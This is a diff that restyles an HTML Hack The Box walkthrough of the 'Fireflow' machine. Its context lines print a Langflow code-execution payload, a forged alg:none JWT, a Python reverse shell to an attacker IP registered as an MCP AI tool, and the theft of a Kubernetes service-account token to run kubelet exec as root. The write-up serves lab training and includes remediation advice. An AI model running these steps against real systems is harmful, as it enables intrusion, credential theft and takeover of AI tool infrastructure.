@@ -1,169 +1,38 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fireflow - HTB Full Pwn Report</title>
-    <link rel="stylesheet" href="../style.css">
-    <style>
-      :root {
-        --bg: #0f172a;
-        --panel: #111827;
-        --panel-2: #1f2937;
-        --text: #e5e7eb;
-        --muted: #9ca3af;
-        --accent: #38bdf8;
-        --accent-2: #22c55e;
-        --warn: #f59e0b;
-        --danger: #ef4444;
-        --border: #334155;
-        --code-bg: #020617;
-      }
-      body {
-        margin: 0;
-        font-family: Arial, Helvetica, sans-serif;
-        background: var(--bg);
-        color: var(--text);
-        line-height: 1.6;
-      }
-      header {
-        padding: 52px 24px;
-        text-align: center;
-        background: linear-gradient(135deg, #111827 0%, #0f172a 55%, #082f49 100%);
-        border-bottom: 1px solid var(--border);
-      }
-      header h1 {
-        margin: 0;
-        font-size: 2.7rem;
-        letter-spacing: 1px;
-      }
-      header p {
-        color: var(--muted);
-        margin-top: 10px;
-        font-size: 1.05rem;
-      }
-      main.report {
-        max-width: 1120px;
-        margin: 0 auto;
-        padding: 32px 20px 64px;
-      }
-      h2 {
-        margin-top: 44px;
-        border-left: 5px solid var(--accent);
-        padding-left: 12px;
-        color: #f8fafc;
-      }
-      h3 {
-        margin-top: 30px;
-        color: #bae6fd;
-      }
-      h4 {
-        color: #bbf7d0;
-        margin-bottom: 6px;
-      }
-      p, li { color: var(--text); }
-      a { color: var(--accent); }
-      code {
-        background: rgba(2, 6, 23, 0.85);
-        color: #f8fafc;
-        padding: 2px 5px;
-        border-radius: 4px;
-      }
-      pre {
-        background: var(--code-bg);
-        color: #e2e8f0;
-        padding: 16px;
-        border-radius: 10px;
-        overflow-x: auto;
-        border: 1px solid var(--border);
-      }
-      pre code { background: transparent; padding: 0; }
-      .card {
-        background: var(--panel);
-        border: 1px solid var(--border);
-        border-radius: 14px;
-        padding: 18px;
-        margin: 18px 0;
-      }
-      .callout {
-        background: rgba(56, 189, 248, 0.08);
-        border-left: 4px solid var(--accent);
-        padding: 14px 16px;
-        border-radius: 8px;
-        margin: 18px 0;
-      }
-      .warning {
-        background: rgba(245, 158, 11, 0.08);
-        border-left: 4px solid var(--warn);
-      }
-      .success {
-        background: rgba(34, 197, 94, 0.08);
-        border-left: 4px solid var(--accent-2);
-      }
-      .danger {
-        background: rgba(239, 68, 68, 0.08);
-        border-left: 4px solid var(--danger);
-      }
-      .report-table {
-        width: 100%;
-        border-collapse: collapse;
-        margin: 18px 0;
-        background: var(--panel);
-        border: 1px solid var(--border);
-      }
-      .report-table th, .report-table td {
-        border: 1px solid var(--border);
-        padding: 10px;
-        text-align: left;
-        vertical-align: top;
-      }
-      .report-table th {
-        background: var(--panel-2);
-        color: #f8fafc;
-      }
-      .phase-grid {
-        display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(235px, 1fr));
-        gap: 14px;
-      }
-      .badge {
-        display: inline-block;
-        padding: 4px 8px;
-        border-radius: 999px;
-        background: #0c4a6e;
-        color: #e0f2fe;
-        font-size: 0.85rem;
-        margin: 2px;
-      }
-      .redacted {
-        color: #fca5a5;
-        font-weight: bold;
-      }
-      .toc ol {
-        columns: 2;
-        column-gap: 28px;
-      }
-      footer {
-        margin-top: 42px;
-        color: var(--muted);
-        font-size: 0.95rem;
-      }
-      @media (max-width: 720px) {
-        .toc ol { columns: 1; }
-        header h1 { font-size: 2.1rem; }
-      }
-    </style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Fireflow - HTB Report</title>
+    <link rel="stylesheet" href="../style.css" />
   </head>
-
   <body>
-    <header>
-      <h1>Fireflow</h1>
-      <p>Hack The Box Full Pwn Report | Langflow RCE → Credential Reuse → MCP JWT Abuse → Kubernetes nodes/proxy → Root</p>
+    <header class="site-header">
+      <nav class="nav">
+        <a class="brand" href="../index.html">HTB Reports</a>
+        <a class="nav-pill" href="../index.html">All reports</a>
+      </nav>
     </header>
 
-    <main class="report">
+    <section class="hero">
+      <div class="hero-card">
+        <p class="eyebrow">Hack The Box Walkthrough</p>
+        <h1 class="main-title">Fireflow</h1>
+        <p class="subtitle">Hack The Box retired machine report</p>
+      </div>
+    </section>
+
+    <div class="layout">
+      <aside>
+        <h2>Contents</h2>
+        <div class="toc"><a href="#machine-information">Machine Information</a><a href="#executive-summary">Executive Summary</a><a href="#report-structure">Report Structure</a><a href="#phase-1-reconnaissance">Phase 1: Reconnaissance</a><a class="toc-sub" href="#initial-nmap-scan">Initial Nmap Scan</a><a class="toc-sub" href="#service-version-scan">Service Version Scan</a><a class="toc-sub" href="#hosts-file-setup">Hosts File Setup</a><a href="#phase-2-web-and-service-enumeration">Phase 2: Web and Service Enumeration</a><a class="toc-sub" href="#https-certificate-handling">HTTPS Certificate Handling</a><a class="toc-sub" href="#main-site-enumeration">Main Site Enumeration</a><a class="toc-sub" href="#directory-enumeration">Directory Enumeration</a><a class="toc-sub" href="#langflow-subdomain">Langflow Subdomain</a><a class="toc-sub" href="#directory-enumeration-on-flow-fireflow-htb">Directory Enumeration on flow.fireflow.htb</a><a href="#phase-3-initial-access-via-langflow-rce">Phase 3: Initial Access via Langflow RCE</a><a class="toc-sub" href="#vulnerable-component">Vulnerable Component</a><a class="toc-sub" href="#command-execution-proof">Command Execution Proof</a><a class="toc-sub" href="#reverse-shell-as-www-data">Reverse Shell as www-data</a><a href="#phase-4-post-exploitation-and-credential-reuse">Phase 4: Post-Exploitation and Credential Reuse</a><a class="toc-sub" href="#langflow-files">Langflow Files</a><a class="toc-sub" href="#linpeas-and-environment-variables">LinPEAS and Environment Variables</a><a class="toc-sub" href="#ssh-as-nightfall">SSH as nightfall</a><a href="#phase-5-user-flag">Phase 5: User Flag</a><a href="#phase-6-privilege-escalation-enumeration">Phase 6: Privilege Escalation Enumeration</a><a class="toc-sub" href="#sudo-check">Sudo Check</a><a class="toc-sub" href="#sudo-version-lead">Sudo Version Lead</a><a class="toc-sub" href="#home-directory-enumeration">Home Directory Enumeration</a><a href="#phase-7-mcp-ai-tool-registry-discovery">Phase 7: MCP AI Tool Registry Discovery</a><a class="toc-sub" href="#mcp-configuration">MCP Configuration</a><a class="toc-sub" href="#service-metadata">Service Metadata</a><a class="toc-sub" href="#normal-authentication">Normal Authentication</a><a href="#phase-8-jwt-alg-none-authentication-bypass">Phase 8: JWT alg:none Authentication Bypass</a><a class="toc-sub" href="#admin-endpoint-test">Admin Endpoint Test</a><a class="toc-sub" href="#tool-registration-schema">Tool Registration Schema</a><a href="#phase-9-mcp-tool-registration-and-pod-shell">Phase 9: MCP Tool Registration and Pod Shell</a><a class="toc-sub" href="#tool-enumeration">Tool Enumeration</a><a class="toc-sub" href="#failed-custom-function-approach">Failed Custom Function Approach</a><a class="toc-sub" href="#working-top-level-python-reverse-shell">Working Top-Level Python Reverse Shell</a><a class="toc-sub" href="#triggering-the-mcp-tool">Triggering the MCP Tool</a><a class="toc-sub" href="#pod-context">Pod Context</a><a href="#phase-10-kubernetes-service-account-enumeration">Phase 10: Kubernetes Service Account Enumeration</a><a class="toc-sub" href="#service-account-variables">Service Account Variables</a><a class="toc-sub" href="#api-server-check">API Server Check</a><a class="toc-sub" href="#selfsubjectrulesreview">SelfSubjectRulesReview</a><a href="#phase-11-nodes-proxy-abuse-and-target-pod-selection">Phase 11: nodes/proxy Abuse and Target Pod Selection</a><a class="toc-sub" href="#node-name">Node Name</a><a class="toc-sub" href="#list-pods-through-nodes-proxy">List Pods Through nodes/proxy</a><a href="#phase-12-kubelet-exec-into-node-exporter">Phase 12: Kubelet Exec into node-exporter</a><a class="toc-sub" href="#external-kubelet-test">External Kubelet Test</a><a class="toc-sub" href="#python-websocket-kubelet-exec-from-mcp">Python WebSocket Kubelet Exec from MCP</a><a class="toc-sub" href="#root-execution-check">Root Execution Check</a><a class="toc-sub" href="#read-host-root-flag">Read Host Root Flag</a><a href="#flags">Flags</a><a href="#tools-used">Tools Used</a><a href="#lessons-learned">Lessons Learned</a><a href="#remediation-recommendations">Remediation Recommendations</a><a href="#final-attack-path">Final Attack Path</a></div>
+      </aside>
+
+      <main class="report-shell">
+        <div id="overview"></div>
+        
       <section class="card">
-        <h2>Machine Information</h2>
+        <h2 id="machine-information">Machine Information</h2>
         <table class="report-table">
           <tbody>
             <tr><th>Name</th><td>Fireflow</td></tr>
@@ -179,7 +48,7 @@
       </section>
 
       <section>
-        <h2>Executive Summary</h2>
+        <h2 id="executive-summary">Executive Summary</h2>
         <p>
           Fireflow exposed an HTTPS landing page that led to a Langflow instance hosted on
           <code>flow.fireflow.htb</code>. Langflow was vulnerable to unauthenticated code execution
@@ -209,7 +78,7 @@
       </section>
 
       <section class="card toc">
-        <h2>Report Structure</h2>
+        <h2 id="report-structure">Report Structure</h2>
         <ol>
           <li>Reconnaissance</li>
           <li>Web and Service Enumeration</li>
@@ -227,8 +96,8 @@
       </section>
 
       <section>
-        <h2>Phase 1: Reconnaissance</h2>
-        <h3>Initial Nmap Scan</h3>
+        <h2 id="phase-1-reconnaissance">Phase 1: Reconnaissance</h2>
+        <h3 id="initial-nmap-scan">Initial Nmap Scan</h3>
         <pre><code>nmap 10.129.22.117 -oA Nmap/initial</code></pre>
         <table class="report-table">
           <thead><tr><th>Port</th><th>State</th><th>Service</th><th>Notes</th></tr></thead>
@@ -244,7 +113,7 @@
           </tbody>
         </table>
 
-        <h3>Service Version Scan</h3>
+        <h3 id="service-version-scan">Service Version Scan</h3>
         <pre><code>nmap -sC -sV -p 22,443,9100,30000,30718,30951,31038,31337 10.129.22.117 -oA Nmap/full</code></pre>
         <pre><code>22/tcp   open      ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
 443/tcp  open      ssl/http  nginx
@@ -257,14 +126,14 @@
           <code>*.fireflow.htb</code>, which indicated that virtual host enumeration would be important.
         </div>
 
-        <h3>Hosts File Setup</h3>
+        <h3 id="hosts-file-setup">Hosts File Setup</h3>
         <pre><code>echo "10.129.22.117 fireflow.htb" | sudo tee -a /etc/hosts
 echo "10.129.22.117 flow.fireflow.htb" | sudo tee -a /etc/hosts</code></pre>
       </section>
 
       <section>
-        <h2>Phase 2: Web and Service Enumeration</h2>
-        <h3>HTTPS Certificate Handling</h3>
+        <h2 id="phase-2-web-and-service-enumeration">Phase 2: Web and Service Enumeration</h2>
+        <h3 id="https-certificate-handling">HTTPS Certificate Handling</h3>
         <p>
           Initial <code>curl</code> requests failed because the site used a self-signed certificate.
           The <code>-k</code> flag was used to ignore certificate validation during testing.
@@ -276,7 +145,7 @@ X-Frame-Options: ALLOW-FROM https://flow.fireflow.htb
 X-Content-Type-Options: nosniff
 Referrer-Policy: strict-origin-when-cross-origin</code></pre>
 
-        <h3>Main Site Enumeration</h3>
+        <h3 id="main-site-enumeration">Main Site Enumeration</h3>
         <pre><code>whatweb https://fireflow.htb</code></pre>
         <pre><code>https://fireflow.htb [200 OK] Email[ops@fireflow.htb], HTML5, HTTPServer[nginx], Title[FireFlow — Task Force Nightfall]</code></pre>
         <p>
@@ -285,7 +154,7 @@ Referrer-Policy: strict-origin-when-cross-origin</code></pre>
           <code>/playground/7d84d636-af65-42e4-ac38-26e867052c25</code>.
         </p>
 
-        <h3>Directory Enumeration</h3>
+        <h3 id="directory-enumeration">Directory Enumeration</h3>
         <pre><code>gobuster dir -u https://fireflow.htb \
   -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
   -k -x php,html,js,json,txt -t 50</code></pre>
@@ -296,7 +165,7 @@ Referrer-Policy: strict-origin-when-cross-origin</code></pre>
           </tbody>
         </table>
 
-        <h3>Langflow Subdomain</h3>
+        <h3 id="langflow-subdomain">Langflow Subdomain</h3>
         <pre><code>curl -k -I https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25</code></pre>
         <pre><code>HTTP/1.1 200 OK
 Server: nginx
@@ -305,7 +174,7 @@ Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: 
         <pre><code>whatweb https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25 --no-errors</code></pre>
         <pre><code>https://flow.fireflow.htb/... [200 OK] Title[Langflow]</code></pre>
 
-        <h3>Directory Enumeration on flow.fireflow.htb</h3>
+        <h3 id="directory-enumeration-on-flow-fireflow-htb">Directory Enumeration on flow.fireflow.htb</h3>
         <pre><code>gobuster dir -u https://flow.fireflow.htb \
   -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
   -k -x php,txt,html,js,json --exclude-length 1142 -t 50</code></pre>
@@ -328,8 +197,8 @@ Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: 
       </section>
 
       <section>
-        <h2>Phase 3: Initial Access via Langflow RCE</h2>
-        <h3>Vulnerable Component</h3>
+        <h2 id="phase-3-initial-access-via-langflow-rce">Phase 3: Initial Access via Langflow RCE</h2>
+        <h3 id="vulnerable-component">Vulnerable Component</h3>
         <p>
           The Langflow instance was identified as Flow engine <code>1.8.2</code>. The public playground
           used a flow build endpoint that accepted client-supplied flow data. By modifying the
@@ -347,7 +216,7 @@ Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: 
           </tbody>
         </table>
 
-        <h3>Command Execution Proof</h3>
+        <h3 id="command-execution-proof">Command Execution Proof</h3>
         <p>
           The component method was modified to execute <code>id</code> and return the result in the
           Langflow output.
@@ -357,7 +226,7 @@ Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: 
     return Message(text=os.popen("id").read())</code></pre>
         <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
 
-        <h3>Reverse Shell as www-data</h3>
+        <h3 id="reverse-shell-as-www-data">Reverse Shell as www-data</h3>
         <p>A reverse shell payload was then executed through the same flow build path.</p>
         <pre><code># Attacker machine
 nc -lvnp 4444
@@ -374,15 +243,15 @@ www-data@fireflow:/var/lib/langflow$ pwd
       </section>
 
       <section>
-        <h2>Phase 4: Post-Exploitation and Credential Reuse</h2>
-        <h3>Langflow Files</h3>
+        <h2 id="phase-4-post-exploitation-and-credential-reuse">Phase 4: Post-Exploitation and Credential Reuse</h2>
+        <h3 id="langflow-files">Langflow Files</h3>
         <pre><code>ls -la /var/lib/langflow</code></pre>
         <pre><code>ba4fe756-d6f7-4c7a-a7b1-f986206878ec
 langflow.db
 profile_pictures
 secret_key</code></pre>
 
-        <h3>LinPEAS and Environment Variables</h3>
+        <h3 id="linpeas-and-environment-variables">LinPEAS and Environment Variables</h3>
         <p>
           LinPEAS revealed environment variables for the Langflow process. The key finding was a
           Langflow superuser password. The value also hinted at the local user <code>nightfall</code>.
@@ -397,7 +266,7 @@ LANGFLOW_SUPERUSER_PASSWORD=&lt;redacted&gt;</code></pre>
           The Langflow superuser password was reused for the local Linux user <code>nightfall</code>.
         </div>
 
-        <h3>SSH as nightfall</h3>
+        <h3 id="ssh-as-nightfall">SSH as nightfall</h3>
         <pre><code>ssh nightfall@10.129.22.117</code></pre>
         <pre><code>nightfall@fireflow:~$ whoami
 nightfall
@@ -406,7 +275,7 @@ user.txt</code></pre>
       </section>
 
       <section>
-        <h2>Phase 5: User Flag</h2>
+        <h2 id="phase-5-user-flag">Phase 5: User Flag</h2>
         <pre><code>nightfall@fireflow:~$ cat user.txt
 &lt;redacted&gt;</code></pre>
         <p>
@@ -416,12 +285,12 @@ user.txt</code></pre>
       </section>
 
       <section>
-        <h2>Phase 6: Privilege Escalation Enumeration</h2>
-        <h3>Sudo Check</h3>
+        <h2 id="phase-6-privilege-escalation-enumeration">Phase 6: Privilege Escalation Enumeration</h2>
+        <h3 id="sudo-check">Sudo Check</h3>
         <pre><code>sudo -l</code></pre>
         <pre><code>Sorry, user nightfall may not run sudo on fireflow.</code></pre>
 
-        <h3>Sudo Version Lead</h3>
+        <h3 id="sudo-version-lead">Sudo Version Lead</h3>
         <pre><code>sudo -V</code></pre>
         <pre><code>Sudo version 1.9.15p5
 Sudoers policy plugin version 1.9.15p5</code></pre>
@@ -435,7 +304,7 @@ woot!
 [sudo] password for nightfall:
 sudo: you are not permitted to use the -R option with woot</code></pre>
 
-        <h3>Home Directory Enumeration</h3>
+        <h3 id="home-directory-enumeration">Home Directory Enumeration</h3>
         <pre><code>find ~ -maxdepth 4 -type f -ls 2&gt;/dev/null</code></pre>
         <pre><code>/home/nightfall/.mcp/config.json
 /home/nightfall/user.txt
@@ -447,8 +316,8 @@ sudo: you are not permitted to use the -R option with woot</code></pre>
       </section>
 
       <section>
-        <h2>Phase 7: MCP AI Tool Registry Discovery</h2>
-        <h3>MCP Configuration</h3>
+        <h2 id="phase-7-mcp-ai-tool-registry-discovery">Phase 7: MCP AI Tool Registry Discovery</h2>
+        <h3 id="mcp-configuration">MCP Configuration</h3>
         <pre><code>cat ~/.mcp/config.json</code></pre>
         <pre><code>{
   "server": "http://10.129.22.117:30080",
@@ -457,7 +326,7 @@ sudo: you are not permitted to use the -R option with woot</code></pre>
   "password": "&lt;redacted&gt;"
 }</code></pre>
 
-        <h3>Service Metadata</h3>
+        <h3 id="service-metadata">Service Metadata</h3>
         <pre><code>curl -i -u 'langflow-bot:&lt;password&gt;' http://127.0.0.1:30080/api/v1/version</code></pre>
         <pre><code>{
   "service": "MCP AI Tool Registry",
@@ -476,7 +345,7 @@ sudo: you are not permitted to use the -R option with woot</code></pre>
   ]
 }</code></pre>
 
-        <h3>Normal Authentication</h3>
+        <h3 id="normal-authentication">Normal Authentication</h3>
         <pre><code>curl -s -X POST http://127.0.0.1:30080/api/v1/auth \
   -H 'Content-Type: application/json' \
   -d '{"username":"langflow-bot","password":"&lt;password&gt;"}' | python3 -m json.tool</code></pre>
@@ -492,7 +361,7 @@ sudo: you are not permitted to use the -R option with woot</code></pre>
       </section>
 
       <section>
-        <h2>Phase 8: JWT alg:none Authentication Bypass</h2>
+        <h2 id="phase-8-jwt-alg-none-authentication-bypass">Phase 8: JWT alg:none Authentication Bypass</h2>
         <p>
           A forged unsigned JWT was created with <code>role=admin</code>. Because the MCP service
           accepted <code>alg:none</code>, the token was accepted without a valid signature.
@@ -511,7 +380,7 @@ print(b64url(header) + "." + b64url(payload) + ".")
 PY
 )</code></pre>
 
-        <h3>Admin Endpoint Test</h3>
+        <h3 id="admin-endpoint-test">Admin Endpoint Test</h3>
         <pre><code>curl -i -X POST http://127.0.0.1:30080/api/v1/tools \
   -H "Authorization: Bearer $ADMIN_TOKEN" \
   -H "Content-Type: application/json" \
@@ -523,7 +392,7 @@ PY
           reached request-body validation instead of being rejected as unauthorized.
         </p>
 
-        <h3>Tool Registration Schema</h3>
+        <h3 id="tool-registration-schema">Tool Registration Schema</h3>
         <pre><code>curl -s http://127.0.0.1:30080/openapi.json | python3 -m json.tool | grep -A60 '"ToolRegisterRequest"'</code></pre>
         <pre><code>required:
   - name
@@ -532,8 +401,8 @@ PY
       </section>
 
       <section>
-        <h2>Phase 9: MCP Tool Registration and Pod Shell</h2>
-        <h3>Tool Enumeration</h3>
+        <h2 id="phase-9-mcp-tool-registration-and-pod-shell">Phase 9: MCP Tool Registration and Pod Shell</h2>
+        <h3 id="tool-enumeration">Tool Enumeration</h3>
         <pre><code>curl -s -X POST http://127.0.0.1:30080/mcp \
   -H "Authorization: Bearer $ADMIN_TOKEN" \
   -H "Content-Type: application/json" \
@@ -545,14 +414,14 @@ proof
 whoami_check
 write_test2</code></pre>
 
-        <h3>Failed Custom Function Approach</h3>
+        <h3 id="failed-custom-function-approach">Failed Custom Function Approach</h3>
         <p>
           Initial custom tools used a <code>def run()</code> function and registered successfully, but
           the MCP call returned blank output and did not produce side effects. This showed that the
           payload needed to execute as top-level Python code and detach from the HTTP request.
         </p>
 
-        <h3>Working Top-Level Python Reverse Shell</h3>
+        <h3 id="working-top-level-python-reverse-shell">Working Top-Level Python Reverse Shell</h3>
         <p>
           A top-level Python payload was registered using <code>subprocess.Popen</code>. The spawned
           child process detached from the request handler and connected back to the attacker.
@@ -569,7 +438,7 @@ nc -lvnp 5555</code></pre>
     "code":"import subprocess,os,sys;subprocess.Popen([\"python3\",\"-c\",\"import socket,subprocess,os,pty;s=socket.socket();s.connect((\\\"10.10.14.209\\\",5555));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\\\"/bin/bash\\\")\"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);print(\"shell spawned\")"
   }'</code></pre>
 
-        <h3>Triggering the MCP Tool</h3>
+        <h3 id="triggering-the-mcp-tool">Triggering the MCP Tool</h3>
         <pre><code>curl -i -X POST http://127.0.0.1:30080/mcp \
   -H "Authorization: Bearer $ADMIN_TOKEN" \
   -H "Content-Type: application/json" \
@@ -585,7 +454,7 @@ bash: cannot set terminal process group (1): Inappropriate ioctl for device
 bash: no job control in this shell
 mcp@mcp-server-54464cb475-29ztf:/app$</code></pre>
 
-        <h3>Pod Context</h3>
+        <h3 id="pod-context">Pod Context</h3>
         <pre><code>mcp@mcp-server-54464cb475-29ztf:/app$ env | grep KUBERNETES
 KUBERNETES_SERVICE_HOST=10.43.0.1
 KUBERNETES_SERVICE_PORT=443</code></pre>
@@ -594,19 +463,19 @@ KUBERNETES_SERVICE_PORT=443</code></pre>
       </section>
 
       <section>
-        <h2>Phase 10: Kubernetes Service Account Enumeration</h2>
-        <h3>Service Account Variables</h3>
+        <h2 id="phase-10-kubernetes-service-account-enumeration">Phase 10: Kubernetes Service Account Enumeration</h2>
+        <h3 id="service-account-variables">Service Account Variables</h3>
         <pre><code>TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
 KUBE=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT</code></pre>
 
-        <h3>API Server Check</h3>
+        <h3 id="api-server-check">API Server Check</h3>
         <pre><code>curl -sSk --cacert $CA \
   -H "Authorization: Bearer $TOKEN" \
   $KUBE/api</code></pre>
 
-        <h3>SelfSubjectRulesReview</h3>
+        <h3 id="selfsubjectrulesreview">SelfSubjectRulesReview</h3>
         <pre><code>curl -sSk --cacert $CA \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
@@ -630,15 +499,15 @@ KUBE=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT</code></pre>
       </section>
 
       <section>
-        <h2>Phase 11: nodes/proxy Abuse and Target Pod Selection</h2>
-        <h3>Node Name</h3>
+        <h2 id="phase-11-nodes-proxy-abuse-and-target-pod-selection">Phase 11: nodes/proxy Abuse and Target Pod Selection</h2>
+        <h3 id="node-name">Node Name</h3>
         <p>
           The service account token identified the node as <code>fireflow</code>. The same value can also
           be obtained by querying nodes if the token permits it.
         </p>
         <pre><code>NODE_NAME=fireflow</code></pre>
 
-        <h3>List Pods Through nodes/proxy</h3>
+        <h3 id="list-pods-through-nodes-proxy">List Pods Through nodes/proxy</h3>
         <pre><code>curl -sSk --cacert $CA \
   -H "Authorization: Bearer $TOKEN" \
   "$KUBE/api/v1/nodes/$NODE_NAME/proxy/pods" \
@@ -658,7 +527,7 @@ Node: fireflow Namespace: kube-system  Pod: metrics-server-...</code></pre>
       </section>
 
       <section>
-        <h2>Phase 12: Kubelet Exec into node-exporter</h2>
+        <h2 id="phase-12-kubelet-exec-into-node-exporter">Phase 12: Kubelet Exec into node-exporter</h2>
         <p>
           The intended root path was kubelet <code>/exec</code> against the privileged
           <code>prometheus-prometheus-node-exporter-nmntq</code> pod. Direct access to kubelet port
@@ -668,7 +537,7 @@ Node: fireflow Namespace: kube-system  Pod: metrics-server-...</code></pre>
           <code>v4.channel.k8s.io</code> protocol.
         </p>
 
-        <h3>External Kubelet Test</h3>
+        <h3 id="external-kubelet-test">External Kubelet Test</h3>
         <pre><code>nmap -p 10250,6443 10.129.22.117</code></pre>
         <pre><code>10250/tcp filtered
 6443/tcp  open</code></pre>
@@ -678,7 +547,7 @@ Node: fireflow Namespace: kube-system  Pod: metrics-server-...</code></pre>
           tool that created the WebSocket connection from inside the target-side MCP container.
         </p>
 
-        <h3>Python WebSocket Kubelet Exec from MCP</h3>
+        <h3 id="python-websocket-kubelet-exec-from-mcp">Python WebSocket Kubelet Exec from MCP</h3>
         <pre><code>import socket, ssl, base64, os, struct, time
 
 TOKEN = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
@@ -704,7 +573,7 @@ s = ctx.wrap_socket(socket.create_connection((HOST, PORT), timeout=5), server_ho
 s.settimeout(5)
 s.sendall(req.encode())</code></pre>
 
-        <h3>Root Execution Check</h3>
+        <h3 id="root-execution-check">Root Execution Check</h3>
         <pre><code>HTTP/1.1 101 Switching Protocols
 Upgrade: websocket
 Connection: Upgrade
@@ -712,7 +581,7 @@ Sec-WebSocket-Protocol: v4.channel.k8s.io
 root
 {"metadata":{},"status":"Success"}</code></pre>
 
-        <h3>Read Host Root Flag</h3>
+        <h3 id="read-host-root-flag">Read Host Root Flag</h3>
         <p>
           After confirming command execution as root inside the privileged node-exporter pod, the
           command was changed to read the host root flag through the mounted host filesystem.
@@ -733,13 +602,13 @@ Sec-WebSocket-Protocol: v4.channel.k8s.io
       </section>
 
       <section>
-        <h2>Flags</h2>
+        <h2 id="flags">Flags</h2>
         <pre><code>user.txt: [REDACTED]
 root.txt: [REDACTED]</code></pre>
       </section>
 
       <section>
-        <h2>Tools Used</h2>
+        <h2 id="tools-used">Tools Used</h2>
         <ul>
           <li>Nmap</li>
           <li>curl</li>
@@ -757,7 +626,7 @@ root.txt: [REDACTED]</code></pre>
       </section>
 
       <section>
-        <h2>Lessons Learned</h2>
+        <h2 id="lessons-learned">Lessons Learned</h2>
         <ul>
           <li>
             <strong>Version discovery matters:</strong> identifying Langflow and its version exposed
@@ -792,7 +661,7 @@ root.txt: [REDACTED]</code></pre>
       </section>
 
       <section>
-        <h2>Remediation Recommendations</h2>
+        <h2 id="remediation-recommendations">Remediation Recommendations</h2>
         <ul>
           <li>Upgrade Langflow to a version that patches public flow code execution issues.</li>
           <li>Disable unauthenticated/public flow build endpoints unless explicitly required.</li>
@@ -806,7 +675,7 @@ root.txt: [REDACTED]</code></pre>
       </section>
 
       <section>
-        <h2>Final Attack Path</h2>
+        <h2 id="final-attack-path">Final Attack Path</h2>
         <pre><code>1. Nmap discovered SSH and HTTPS.
 2. HTTPS certificate and page source revealed fireflow.htb and flow.fireflow.htb.
 3. flow.fireflow.htb hosted Langflow 1.8.2 with a public playground.
@@ -829,6 +698,12 @@ root.txt: [REDACTED]</code></pre>
         <p><a href="../index.html">Back to all reports</a></p>
         <p>Report prepared as a professional HTB-style writeup. Report includes completed user and root flags for lab submission.</p>
       </footer>
-    </main>
+    
+        <footer class="report-footer">
+          <a class="back-link" href="../index.html">Back to all reports</a>
+          <p class="footer-note">HTB report • aligned with the Blocky layout</p>
+        </footer>
+      </main>
+    </div>
   </body>
 </html>
